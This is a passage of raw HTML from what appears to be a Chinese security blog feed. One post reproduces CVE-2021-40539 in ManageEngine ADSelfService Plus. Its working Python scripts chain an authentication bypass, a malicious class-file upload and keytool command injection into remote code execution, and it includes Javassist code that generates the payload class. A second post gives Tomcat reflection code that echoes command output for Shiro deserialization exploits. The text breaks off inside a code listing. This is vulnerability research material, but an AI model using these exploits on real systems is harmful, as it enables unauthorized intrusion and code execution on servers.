class="hljs-string">&#x27;CERTIFICATE_PATH&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Evil.class&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)&#125;<br><br>    proxies=&#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-literal">None</span>&#125;<br>    <span class="hljs-comment">#proxies = &#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;&#125;</span><br><br>    uploadData = &#123;<br>        <span class="hljs-string">&quot;methodToCall&quot;</span>: <span class="hljs-string">&quot;unspecified&quot;</span>,<br>        <span class="hljs-string">&quot;Save&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>        <span class="hljs-string">&quot;form&quot;</span>: <span class="hljs-string">&quot;smartcard&quot;</span>,<br>        <span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;Add&quot;</span><br>    &#125;<br><br>    r1 = requests.post(uploadUrl, data=uploadData, files=files, proxies=proxies)<br><br>    runUrl=url+<span class="hljs-string">&quot;./RestAPI/Connection&quot;</span><br>    <span class="hljs-comment">#files = &#123;&#x27;CERTIFICATE_PATH&#x27;: open(&#x27;1.txt&#x27;, &#x27;rb&#x27;)&#125;</span><br><br><br>    runData=&#123;<br>        <span class="hljs-string">&quot;methodToCall&quot;</span>:<span class="hljs-string">&quot;openSSLTool&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>:<span class="hljs-string">&quot;generateCSR&quot;</span>,<br>        <span class="hljs-string">&quot;KEY_LENGTH&quot;</span>:<span class="hljs-string">&#x27;123 -providerclass &quot;Evil&quot; -providerpath &quot;..\\bin&quot;&#x27;</span><br><br>    &#125;<br>    r2 = requests.post(url=runUrl, data=runData,proxies=proxies)<br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    url = <span class="hljs-string">&quot;http://win-iobn7uhkolu:8888/&quot;</span><br>    UploadRunCalc(url)<br></code></pre></td></tr></table></figure><p>执行成功</p><p><img src="https://z3.ax1x.com/2021/11/17/I54O5F.png" alt="I54O5F.png"></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>CVE-2021-40539实现RCE的过程由3个漏洞组成，分别是</p><ol><li>Restful API认证绕过</li><li>任意文件上传</li><li>命令拼接</li></ol><h2 id="Restful-API认证绕过"><a href="#Restful-API认证绕过" class="headerlink" title="Restful API认证绕过"></a>Restful API认证绕过</h2><p>查看web.xml，RestAPI对应的servlet是<code>action</code></p><p><img src="https://z3.ax1x.com/2021/11/17/I54cHf.png" alt="I54cHf.png"></p><p>ADSFilter是一个全局过滤器</p><p><img src="https://z3.ax1x.com/2021/11/17/I54d4e.png" alt="I54d4e.png"></p><p><code>com.manageengine.ads.fw.filter.ADSFilter#doFilter</code></p><p>定位到对应的类</p><p>判断如果是Restful API访问，尝试提取认证信息，然后调用<code>doSubFilters</code>：</p><p><img src="https://z3.ax1x.com/2021/11/17/I54aND.png" alt="I54aND.png"></p><p><code>com.manageengine.ads.fw.filter.ADSFilter#doSubFilters</code></p><p>重点在<code>RestAPIUtil.isRestAPIRequest</code></p><p><img src="https://z3.ax1x.com/2021/11/17/I54yut.png" alt="I54yut.png"></p><p><code>com.manageengine.ads.fw.api.RestAPIUtil#isRestAPIRequest</code></p><p>正常访问<code>/RestAPI/LicenseMgr</code>，发现没有权限</p><p><img src="https://z3.ax1x.com/2021/11/17/I54rjI.png" alt="I54rjI.png"></p><p>在<code>isRestAPIRequest</code>中可以看到对目录访问的限制，这里只需要绕过一下正则匹配，在前面加上<code>/.</code>即可</p><p><img src="https://z3.ax1x.com/2021/11/17/I5409H.png" alt="I5409H.png"></p><p>这样就能绕过</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/./</span>RestAPI/LicenseMgr<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/11/17/I546DP.png" alt="I546DP.png"></p><p>成功未授权访问</p><p><img src="https://z3.ax1x.com/2021/11/17/I54rjI.png" alt="I54rjI.png"></p><h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><p>在<code>struts-config.xml</code>中找到对应的接口<code>/LogoCustomization</code>，再定位到对应的类<code>com.adventnet.sym.adsm.common.webclient.admin.LogonCustomization#unspecified</code></p><p><img src="https://z3.ax1x.com/2021/11/17/I542E8.png" alt="I542E8.png"></p><p><code>com.adventnet.sym.adsm.common.webclient.admin.LogonCustomization#unspecified</code></p><p>当输入的参数符合条件时，会调用<code>addSmartCardConfig</code></p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">Save=1<span class="hljs-variable">&amp;form</span>=smartcard<span class="hljs-variable">&amp;operation</span>=<span class="hljs-meta">Add</span><br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/11/17/I54hCQ.png" alt="I54hCQ.png"></p><p><code>com.manageengine.ads.fw.authentication.smartcard.SmartCardAction#addSmartCardConfig</code></p><p>调用<code>getFileFromRequest</code></p><p><img src="https://z3.ax1x.com/2021/11/17/I54RUS.png" alt="I54RUS.png"></p><p><code>com.manageengine.ads.fw.util.FileActionHandler#getFileFromRequest</code></p><p>上传文件</p><p><img src="https://z3.ax1x.com/2021/11/17/I54W4g.png" alt="I54W4g.png"></p><p>上传成功会显示404</p><p><img src="https://z3.ax1x.com/2021/11/17/I5443j.png" alt="I5443j.png"></p><p>成功上传到bin目录下</p><p><img src="https://z3.ax1x.com/2021/11/17/I545gs.png" alt="I545gs.png"></p><p>上传文件用的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://win-iobn7uhkolu:8888/./RestAPI/LogonCustomization&quot;</span><br><br>files = &#123;<span class="hljs-string">&#x27;CERTIFICATE_PATH&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)&#125;<br><br>proxies=&#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-literal">None</span>&#125;<br><span class="hljs-comment">#proxies=&#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;</span><br><br>data=&#123;<br>    <span class="hljs-string">&quot;methodToCall&quot;</span>:<span class="hljs-string">&quot;unspecified&quot;</span>,<br>    <span class="hljs-string">&quot;Save&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;form&quot;</span>:<span class="hljs-string">&quot;smartcard&quot;</span>,<br>    <span class="hljs-string">&quot;operation&quot;</span>:<span class="hljs-string">&quot;Add&quot;</span><br>&#125;<br>r = requests.post(url, data=data,files=files,proxies=proxies)<br></code></pre></td></tr></table></figure><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p><code>com.adventnet.sym.adsm.common.webclient.admin.ConnectionAction</code></p><p><img src="https://z3.ax1x.com/2021/11/17/I54Ivn.png" alt="I54Ivn.png"></p><p><code>com.adventnet.sym.adsm.common.webclient.admin.ConnectionAction</code></p><p>满足条件时进入<code>SSLUtil.createCSR(request)</code></p><p><img src="https://z3.ax1x.com/2021/11/17/I54Tuq.png" alt="I54Tuq.png"></p><p><code>com.adventnet.sym.adsm.common.webclient.util.SSLUtil#createCSR</code></p><p>进入<code>createCSR</code></p><p><img src="https://z3.ax1x.com/2021/11/17/I54HbV.png" alt="I54HbV.png"></p><p><code>com.adventnet.sym.adsm.common.webclient.util.SSLUtil#createCSR</code></p><p>调用<code>runCommand</code>执行命令，参数<code>-keysize</code>直接来源于<code>KEY_LENGTH</code>，而<code>KEY_LENGTH</code>来源于<code>request.getParameter(&quot;KEY_LENGTH&quot;)</code>，这样就可以进行命令注入</p><p><img src="https://z3.ax1x.com/2021/11/17/I54jC4.png" alt="I54jC4.png"></p><p><img src="https://z3.ax1x.com/2021/11/17/I54qET.png" alt="I54qET.png"></p><p>主要调用了<code>keytool.exe -genkey</code>，这个方法的参数如下</p><p>genkey命令有两个参数<code>providerclass</code>和<code>providerpath</code>，可以用来指定字节码.class文件和文件路径，然后执行字节码文件中的JAVA代码。这里跟前面的任意文件上传配合一下就可以实现RCE了，先上传一个class文件到bin目录，然后利用keytool拼接命令指定对应的参数，就可以执行上传的字节码文件。</p><p><img src="https://z3.ax1x.com/2021/11/17/I547D0.png" alt="I547D0.png"></p><p>实际上拼接进去的参数如下</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">KEN_LENGTH=<span class="hljs-number">1024</span> -providerclass <span class="hljs-string">&quot;Evil&quot;</span> -providerpath <span class="hljs-string">&quot;C:<span class="hljs-subst">\\</span>ManageEngine<span class="hljs-subst">\\</span>ADSelfService Plus<span class="hljs-subst">\\</span>bin&quot;</span><br></code></pre></td></tr></table></figure><p>生成一个恶意class文件，然后把它上传上去，然后利用keytool命令注入执行即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JavassistTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception </span>&#123;<br><br><br>        ClassPool pool=ClassPool.getDefault();<br>        CtClass ctClass=pool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd=<span class="hljs-string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>;<br><br>        CtConstructor ctConstructor=ctClass.makeClassInitializer();<br>        ctConstructor.insertBefore(cmd);<br><br>        ctClass.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>实际执行的命令</p><p><img src="https://z3.ax1x.com/2021/11/17/I54LUU.png" alt="I54LUU.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://forum.butian.net/share/876">https://forum.butian.net/share/876</a></p><p><a href="https://www.jianshu.com/p/a1591b2ad7cf">https://www.jianshu.com/p/a1591b2ad7cf</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat通用回显学习笔记</title>
    <link href="/2021/10/27/Tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/10/27/Tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了解决Shiro反序列化命令执行没有回显的问题，我们需要想办法构造出回显。思路是寻找存储 request 和 response 的全局变量，然后利用反射获取这个变量，利用获取到的request和response把命令执行的结果写入到页面上。</p><p>寻找存储request和response的变量的详细过程可参考这篇文章：<a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a></p><p>基于全局存储思路出现了两种获取request和response的方法：</p><ul><li><p>方法一：通过 <code>WebappClassLoaderBase </code>来获取 Tomcat 上下文的联系，进而获取AbstractProtocol$ConnectoinHandler（不适用Tomcat7）</p><p>WebappClassLoaderBase —&gt; ApplicationContext(getResources().getContext()) —&gt; StandardService—&gt;Connector—&gt;AbstractProtocol$ConnectoinHandler—&gt;RequestGroupInfo(global)—&gt;RequestInfo——-&gt;Request——–&gt;Response</p></li><li><p>方法二：通过遍历线程获取 NioEndpoint，进而获取AbstractProtocol$ConnectoinHandler（适用于Tomcat7/8/9）</p><p>Thread.currentThread().getThreadGroup() —&gt; NioEndpoint$Poller —&gt; NioEndpoint—&gt;AbstractProtocol$ConnectoinHandler—&gt;RequestGroupInfo(global)—&gt;RequestInfo——-&gt;Request——–&gt;Response</p></li></ul><p>两种方法的区别在于用了不同的方法获取<code>AbstractProtocol$ConnectoinHandler</code></p><h1 id="1-不适用于Tomcat7的回显方式"><a href="#1-不适用于Tomcat7的回显方式" class="headerlink" title="1.不适用于Tomcat7的回显方式"></a>1.不适用于Tomcat7的回显方式</h1><h2 id="获取request和response"><a href="#获取request和response" class="headerlink" title="获取request和response"></a>获取request和response</h2><p>路径：</p><ol><li>通过 <code>Thread.currentThread().getContextClassLoader() </code>获取上下文中的 StandardService</li><li>从StandardService中获取Connector</li><li>获取Connector中的ProtocolHandler属性，从而获取AbstractProtocol</li><li>获取了 AbstractProtocol$ConnectoinHandler 之后就可以利用反射获取到其 global 属性，</li><li>然后再利用反射获取 gloabl 中的 processors 属性</li><li>然后通过遍历 processors 我们可以获取到我们需要的 Request 和 Response</li></ol><p>WebappClassLoaderBase —&gt; ApplicationContext(getResources().getContext()) —&gt; StandardService—&gt;Connector—&gt;AbstractProtocol$ConnectoinHandler—&gt;RequestGroupInfo(global)—&gt;RequestInfo——-&gt;Request——–&gt;Response</p><p>具体过程：</p><p>1.WebappClassLoaderBase —&gt; ApplicationContext(getResources().getContext()) —&gt; StandardService</p><p><img src="https://z3.ax1x.com/2021/10/27/5bl6UI.png" alt="5bl6UI.png"></p><p>2.WebappClassLoaderBase —&gt; ApplicationContext(getResources().getContext()) —&gt; StandardService—&gt;Connector</p><p><img src="https://z3.ax1x.com/2021/10/27/5bl2PP.png" alt="5bl2PP.png"></p><p>3.WebappClassLoaderBase —&gt; ApplicationContext(getResources().getContext()) —&gt; StandardService—&gt;Connector—&gt;AbstractProtocol$ConnectoinHandler</p><p><img src="https://z3.ax1x.com/2021/10/27/5blR8f.png" alt="5blR8f.png"></p><p>4.WebappClassLoaderBase —&gt; ApplicationContext(getResources().getContext()) —&gt; StandardService—&gt;Connector—&gt;AbstractProtocol$ConnectoinHandler</p><p><img src="https://z3.ax1x.com/2021/10/27/5blW28.png" alt="5blW28.png"></p><p>5.WebappClassLoaderBase —&gt; ApplicationContext(getResources().getContext()) —&gt; StandardService—&gt;Connector—&gt;AbstractProtocol$ConnectoinHandler—&gt;RequestGroupInfo(global)—&gt;RequestInfo——-&gt;Request——–&gt;Response</p><p>最终找到了request</p><p><img src="https://z3.ax1x.com/2021/10/27/5blfxS.png" alt="5blfxS.png"></p><p>获取的属性：WebappClassLoaderBase-&gt;resources-&gt;context-&gt;service-&gt;connectors数组-&gt;protocolhandler-&gt;handler-&gt;global-&gt;processors-&gt;req</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>代码比较简单，就是通过反射一步一步的获取属性，最终成功拿到request和response。作为验证，我们用获取到的response对象在页面上输出<code>TomcatEcho</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.myservlet;<br><br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Connector;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.coyote.*;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Writer;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TomcatEcho</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">boolean</span> flag=<span class="hljs-keyword">false</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();<br><br>            Connector[] connectors=(Connector[]) getField(getField(getField(standardContext,<span class="hljs-string">&quot;context&quot;</span>),<span class="hljs-string">&quot;service&quot;</span>),<span class="hljs-string">&quot;connectors&quot;</span>);<br><br><br>            <span class="hljs-keyword">for</span>(Connector connector:connectors)&#123;<br>                Object global=getField(getField(getField(connector,<span class="hljs-string">&quot;protocolHandler&quot;</span>),<span class="hljs-string">&quot;handler&quot;</span>),<span class="hljs-string">&quot;global&quot;</span>);<br><br>                ArrayList processors=(ArrayList)getField(global,<span class="hljs-string">&quot;processors&quot;</span>);<br><br><br>                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;processors.size();i++)&#123;<br>                    RequestInfo requestInfo=(RequestInfo) processors.get(i);<br><br>                    <span class="hljs-keyword">if</span>(requestInfo!=<span class="hljs-keyword">null</span>)&#123;<br>                        Request request=(Request) getField(requestInfo,<span class="hljs-string">&quot;req&quot;</span>);<br><br>                        org.apache.catalina.connector.Request Myrequest=(org.apache.catalina.connector.Request) request.getNote(<span class="hljs-number">1</span>);<br>                        org.apache.catalina.connector.Response Myresponse=Myrequest.getResponse();<br><br>                        Writer writer=Myresponse.getWriter();<br>                        writer.flush();<br>                        writer.write(<span class="hljs-string">&quot;TomcatEcho&quot;</span>);<br>                        flag=<span class="hljs-keyword">true</span>;<br>                        <span class="hljs-keyword">if</span>(flag)&#123;<br>                            <span class="hljs-keyword">break</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span>(flag)&#123;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br><br><br>                &#125;<br><br>            &#125;<br><br><br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        doGet(req,resp);<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">getField</span><span class="hljs-params">(Object obj,String fieldName)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Field field=<span class="hljs-keyword">null</span>;<br>        Class clas=obj.getClass();<br><br>        <span class="hljs-keyword">while</span>(clas!=Object.class)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                field=clas.getDeclaredField(fieldName);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<span class="hljs-keyword">catch</span> (NoSuchFieldException e)&#123;<br>                clas=clas.getSuperclass();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (field!=<span class="hljs-keyword">null</span>)&#123;<br>            field.setAccessible(<span class="hljs-keyword">true</span>);<br>            <span class="hljs-keyword">return</span> field.get(obj);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NoSuchFieldException(fieldName);<br>        &#125;<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在Tomcat8和9中都能成功回显</p><p><img src="https://z3.ax1x.com/2021/10/27/5blwvD.png" alt="5blwvD.png"></p><p>在Tomcat7中测试出现错误</p><p><img src="https://z3.ax1x.com/2021/10/27/5bldgO.png" alt="5bldgO.png"></p><h2 id="在Tomcat7中失败的原因"><a href="#在Tomcat7中失败的原因" class="headerlink" title="在Tomcat7中失败的原因"></a>在Tomcat7中失败的原因</h2><p>通过调试发现是在获取<code>StandardContext</code>的过程中出现了问题，也就是下面这句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();<br></code></pre></td></tr></table></figure><p>这说明在Tomcat7中获取到的<code>WebappClassLoaderBase</code>和在Tomcat8、9中获取到的是不一样的，接下来详细看一下各个版本获取到的有什么不同</p><p>Tomcat9获取到的WebappClassLoaderBase</p><p><img src="https://z3.ax1x.com/2021/10/27/5blrbd.png" alt="5blrbd.png"></p><p>Tomcat8获取到的WebappClassLoaderBase</p><p><img src="https://z3.ax1x.com/2021/10/27/5blyVA.png" alt="5blyVA.png"></p><p>Tomcat7获取到的WebappClassLoaderBase中没有context属性，所以会利用失败</p><p><img src="https://z3.ax1x.com/2021/10/27/5blBKe.png" alt="5blBKe.png"></p><h1 id="2-Tomcat7-8-9全版本通用回显方式"><a href="#2-Tomcat7-8-9全版本通用回显方式" class="headerlink" title="2.Tomcat7/8/9全版本通用回显方式"></a>2.Tomcat7/8/9全版本通用回显方式</h1><h2 id="获取request和response-1"><a href="#获取request和response-1" class="headerlink" title="获取request和response"></a>获取request和response</h2><p><code>Thread.currentThread().getContextClassLoader() </code>的目的就是为了获取<code> AbstractProtocol$ConnectoinHandler</code>，但是这种方式在Tomcat7中并不能获取到context，因此我们需要换一种方式，从其他地方获取<code> AbstractProtocol$ConnectoinHandler</code>。</p><p>由于 org.apache.tomcat.util.net.AbstractEndpoint 的 handler 是<code> AbstractEndpoint$Handler</code> 定义的，同时 Handler 的实现类是<code> AbstractProtocol$ConnectoinHandler</code>。因为 AbstractEndpoint 是抽象类，所以需要寻找它的子类—NioEndpoint 类。<strong>通过遍历线程获取到 NioEndpoint$Poller ，然后通过获取其父类 NioEndpoint，进而获取到 handler-&gt;global-&gt; processors-&gt;request</strong></p><p>路径：</p><ol><li>通过 <code>Thread.currentThread().getThreadGroup()</code>获取 NioEndpoint$Poller ，然后获取其父类 NioEndpoint</li><li>通过NioEndpoint获取<code> AbstractProtocol$ConnectoinHandler</code></li><li>获取了 AbstractProtocol$ConnectoinHandler 之后就可以利用反射获取到其 global 属性，</li><li>然后再利用反射获取 gloabl 中的 processors 属性</li><li>然后通过遍历 processors 我们可以获取到我们需要的 Request 和 Response</li></ol><p>Thread.currentThread().getThreadGroup() —&gt; NioEndpoint$Poller —&gt; NioEndpoint—&gt;AbstractProtocol$ConnectoinHandler—&gt;RequestGroupInfo(global)—&gt;RequestInfo——-&gt;Request——–&gt;Response</p><p>1.首先通过 <code>Thread.currentThread().getThreadGroup() </code>获取了一个thread数组·，然后遍历threads数组</p><p><img src="https://z3.ax1x.com/2021/10/27/5blYU1.png" alt="5blYU1.png"></p><p>在遍历到数组中的第五个值的时候，查看相应thread对象的target属性，获取NioEndpoint$Poller</p><p><img src="https://z3.ax1x.com/2021/10/27/5blJER.png" alt="5blJER.png"></p><p>获取父类NioEndpoint</p><p><img src="https://z3.ax1x.com/2021/10/27/5bl8b9.png" alt="5bl8b9.png"></p><p>2.target-&gt;this$0</p><p>已经获取了<code>AbstractProtocol$ConnectoinHandler</code>，按照顺序下一步就是找到global属性</p><p><img src="https://z3.ax1x.com/2021/10/27/5bl3DJ.png" alt="5bl3DJ.png"></p><p>3.target-&gt;this$0-&gt;handler-&gt;global</p><p>获取global属性</p><p><img src="https://z3.ax1x.com/2021/10/27/5bl1u4.png" alt="5bl1u4.png"></p><p>4.target-&gt;this$0-&gt;handler-&gt;global-&gt;processors</p><p>找到processors数组，可以发现req对象，只需要遍历processors数组然后获取这个req对象就可以了</p><p><img src="https://z3.ax1x.com/2021/10/27/5blt4x.png" alt="5blt4x.png"></p><h2 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h2><p>还是利用反射获取属性，跟之前一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 